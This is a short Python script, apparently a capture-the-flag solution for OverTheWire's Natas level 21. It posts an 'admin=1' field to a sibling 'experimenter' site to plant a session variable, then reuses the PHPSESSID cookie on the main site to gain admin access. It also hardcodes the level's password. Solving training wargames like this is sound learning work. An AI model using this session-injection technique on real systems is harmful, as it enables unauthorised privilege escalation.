import requests

auth = ("natas21", "IFekPyrQXftziDEsUr3x21sYuahypdgJ")

data = {
    "admin": "1",
    "submit": "",
}

p = requests.post(
    "http://natas21-experimenter.natas.labs.overthewire.org/",
    auth=auth,
    data=data,
    params={"debug": ""},
)

# p.cookies is bound to p.url, so we cannot re-use it directly, we need to copy its content
cookie = {
    "PHPSESSID": p.cookies.get("PHPSESSID"),
}

r = requests.get(
    "http://natas21.natas.labs.overthewire.org/",
    auth=auth,
    cookies=cookie,  # pwn
)

print(r.content.decode())
